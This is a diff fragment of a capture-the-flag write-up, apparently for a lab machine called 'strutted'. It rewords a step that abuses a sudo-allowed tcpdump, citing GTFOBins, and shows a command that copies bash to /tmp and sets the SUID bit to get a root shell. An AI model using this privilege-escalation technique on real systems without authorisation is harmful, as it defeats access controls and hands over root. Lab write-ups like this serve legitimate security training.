@@ -223,7 +223,7 @@ User james may run the following commands on localhost:
 ```
 
 - GTFOBins has an entry for tcpdump
-- We create a script that will copy `/bin/bash` to `/tmp/root` , assign it the SUID bit, and execute it with root privilege
+- We copy `/bin/bash` to `/tmp/root` , assign it the SUID bit, and execute it with root privilege
 
 ```bash
 james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
